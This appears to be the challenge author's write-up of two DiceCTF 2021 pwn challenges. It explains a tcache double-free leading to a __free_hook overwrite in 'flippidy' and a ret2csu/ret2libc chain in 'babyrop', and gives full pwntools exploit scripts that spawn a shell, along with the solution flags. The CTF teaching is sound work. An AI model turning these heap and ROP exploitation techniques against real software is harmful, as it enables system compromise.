# DiceCTF 2021

This weekend I wrote [`babyrop`](#babyrop) and [`flippidy`](#flippidy), both easy (relatively speaking) pwn challenges for DiceCTF 2021.


## Flippidy
Checksec:
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

This was a heap note challenge. The provided libc version is 2.27 without the tcache double free check.

We are allowed to choose the size of our notebook.

We are given two functions:
Add - create a note (`malloc(0x30)`) at an index and write to the chunk. Doesn't care if the index is taken, will not free it.
Flip - flip the notebook (swap `d c b a` to `a b c d`)

Further, the menu prints 4 pointers from a `char *` array, which correspond to the four lines that comprise the menu.

### Bug
The bug exists in the flip function. When flipping a notebook, it saves the content, frees both indices, mallocs, and then `strcpy`s the content to the opposite chunk.

However if you flip an odd sized notebook with a chunk allocated for the middle index, it double frees it and writes its content to itself after it has been freed, poisoning the tcache.

Because of full RELRO, we cannot attack the GOT. However, the menu is implemented weirdly and the strings are stored in `.data`.

I poisoned the tcache to write to the `char []` pointer by:
- making a notebook sized 7
- adding a chunk at idx 3
- writing `0x404020` (menu pointer) to that chunk
- flipping

Our freelist after flipping: `HEAD -> 0x404020 -> 0x404040 -> 0x654d202d2d2d2d2d`.[[*]](#appendix)

`0x404020` is a pointer to the first string (`"----- Menu -----"`), which is why there are more tcache entries now (`0x654d...` is the actual string).

Now, we can overwrite `[0x404020]` to a GOT entry to leak libc addresses. However, we must overwrite more, as the tcache is currently too messed up to do anything later.

After our first malloc, we are able to write 0x2f bytes to `0x404020`, and the next chunk in the freelist is `0x404040`. We can thus overwrite the data at `0x404040` to an address we will later be able to control (within 0x30 bytes of `0x404040`, like `0x404050`, instead of just pointing to `0x654d202d2d2d2d2d`.

Take care to overwrite the rest of the 3 pointers at `0x404020` with valid string pointers because puts will also try to print those when the menu is printed.

Freelist after our write: `HEAD -> 0x404040 -> 0x404050`

After our write, the menu is printed again, along with a libc address. Now, we have an arbitrary write (we can control what is at `0x404050` when we allocate a 0x30 chunk at `0x404040`).

After our final allocation, we will be able to write the address of `__free_hook` to the fwd of the chunk of `0x404050`, which is still on the freelist.

We can then just allocate another chunk, which will point to `__free_hook`, and write the address of `system` to it.

Finally, we allocate one more chunk at index 0, write `"/bin/sh"` to it, and flip to free it, launching our shell.

Script:
```python
from pwn import *

e = ELF("./flippidy")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = e
context.terminal = ["konsole", "-e"]


"""
p = process([e.path])
context.log_level="debug"
gdb.attach(p, "c")
"""

p = remote("dicec.tf", 31904)

def add(idx, data):
    p.sendlineafter(":", "1")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", data)


def flip():
    p.sendlineafter(":", "2")
    
    
p.sendlineafter("be:", "7")


add(3, p64(0x00404020))

flip()


add(1, p64(e.got["setbuf"]) + p64(0x404158) + p64(0x004040ac) + p64(0x004040de) + p64(0x404050))

p.recvline()
p.recvline()



libc.address = u64(p.recv(6).ljust(8, "\x00")) - libc.sym["setbuf"]

print("libc", hex(libc.address))


p.recv(1)


heap = u32(p.recvline()[:-1].ljust(4, "\x00")) - 0x260

print("heap", hex(heap))


add(1, "A"*16 + p64(libc.sym["__free_hook"]))
add(1, "AAAA")

add(2, p64(libc.sym["system"]))


add(1, "/bin/sh")


flip()

p.interactive()
```

Flag: `dice{some_dance_to_remember_some_dance_to_forget_2.27_checks_aff239e1a52cf55cd85c9c16}`


### Appendix
Some may be confused as to why writing a `0x404020` to the tcache next was possible to poison the tcache, as their heap addresses were 6 bytes. So, writing only 3 bytes would make for a bad chunk pointer and crash the program.

However, the heap addresses on remote were 3-4 bytes. I believe patchelf with the libc and linker also caused the heap addresses to be 3-4 bytes, but using LD_PRELOAD would keep the 6 byte addresses.

Even with a 6 byte heap, the challenge was solvable with a 4 bit brute force. You can write a `\x60\x00` to the chunk after flipping, which will overwrite the last two bytes of the `fwd` of the double freed chunk. This will set you up for a 1/16th chance tcache overwrite to fully poison the freelist with `0x404020`.


## babyrop
Checksec:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

There is a clear buffer overflow in the main function, with an unsafe `gets(&buf)`. No canary and PIE means that this is a clear ROP challenge.

Many people got caught up on controlling a register which seemingly had no useful gadgets to write to, so that is what I will be explaining here.


Libc leak:
The only available [GOT](http://bottomupcs.sourceforge.net/csbu/x3824.htm) functions are `write` and `gets`, so we can't just call `puts()` with a `pop rdi` gadget to leak libc. To get `write()` working, we need control of `rdi`, `rsi`, and `rdx`.

A call to [write](https://www.man7.org/linux/man-pages/man2/write.2.html) needs:
rdi = [file descriptor](http://codemyne.net/Articles/2012/8/File-pointer-basics) (in this case, we want it to be `1` for [stdout](https://en.wikipedia.org/wiki/File_descriptor))
rsi = pointer to what we want to write (GOT entry of `write` to leak the libc address)
rdx = number of bytes to write


Gadgets to control the first two can easily be found with `ROPgadget --binary babyrop`. However, controlling `rdx` is a bit more complicated and requires a technique called [`ret2csu`](https://bananamafia.dev/post/x64-rop-redpwn/).

Our two csu gadgets are contained in `__libc_csu_init`:
```asm
0x00000000004011b0 <+64>:    mov    rdx,r14        (first gadget here)
0x00000000004011b3 <+67>:    mov    rsi,r13
0x00000000004011b6 <+70>:    mov    edi,r12d
0x00000000004011b9 <+73>:    call   QWORD PTR [r15+rbx*8]
0x00000000004011bd <+77>:    add    rbx,0x1
0x00000000004011c1 <+81>:    cmp    rbp,rbx
0x00000000004011c4 <+84>:    jne    0x4011b0 <__libc_csu_init+64>
0x00000000004011c6 <+86>:    add    rsp,0x8
0x00000000004011ca <+90>:    pop    rbx            (second gadget here)
0x00000000004011cb <+91>:    pop    rbp
0x00000000004011cc <+92>:    pop    r12
0x00000000004011ce <+94>:    pop    r13
0x00000000004011d0 <+96>:    pop    r14
0x00000000004011d2 <+98>:    pop    r15
0x00000000004011d4 <+100>:   ret
```

Remember, our goal is to control `rdx`, which gets set to `r14` in the first gadget. We can control `r14` and other registers with a call to the second gadget and writing our desired values to the stack, where they will be popped into said registers.

However, the first gadget doesn't have a `ret`, it has a `call` to whatever `rt15+rbx*8` is pointing to. We have control over both of thse registers using the second gadget. So, I chose to set `r15` to a pointer to `_init`, and set `rbx` equal to 0 (`_init` is just a function that returns quickly). Thus, it would call `_init`, and then eventually `ret` at `+100`.

There is another check in place, at `+84`. It checks if `rbp == rbx`. To solve this I made `rbx = 1, rbp = 0` when I call gadget 2.

After setting up the registers you can just call `write` to leak libc and then `main` to get another opportunity to buffer overflow.

Now with control of `rdi`, `rsi`, `rdx`, and a libc leak, we can determine the right version of libc to use using a tool like [libc.blukat.me](https://libc.blukate.me/), and download it to find the system address.

From there it is a standard ret2libc.

Many people ran into an error with stack alignment. My advice is: if you ever crash on remote and are completely sure that system is getting called with `[rdi] == "/bin/sh"`, just toss a few `ret`s into the final ropchain between the calls.

Script:
```py
from pwn import *

e = ELF("./babyrop")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = e
context.terminal = ["konsole", "-e"]

context.log_level="debug"


p = remote("dicec.tf", 31924)


poprdi = 0x00000000004011d3
csu1 = 0x00000000004011b0
csu2 = 0x00000000004011ca
ret = 0x000000000040101a

points_to_init = 0x4000f8


p.sendlineafter(":", "A"*72 + p64(poprdi) + p64(1) + p64(csu2) + p64(0) + p64(1)*2 + p64(e.got["write"]) + p64(8) + p64(points_to_init) + p64(csu1) + "AAAAAAAA"*7 + p64(e.plt["write"]) + p64(e.sym["main"]))



p.recv(1)

libc.address = u64(p.recv(8).ljust(8, "\x00")) - libc.sym["write"]

print("libc base", hex(libc.address))


p.sendlineafter(":", "A"*72 + p64(ret) + p64(poprdi) + p64(next(libc.search("/bin/sh"))) + p64(ret) + p64(libc.sym["system"]))


p.interactive()
```

Flag: `dice{so_let's_just_pretend_rop_between_you_and_me_was_never_meant_b1b585695bdd0bcf2d144b4b}`
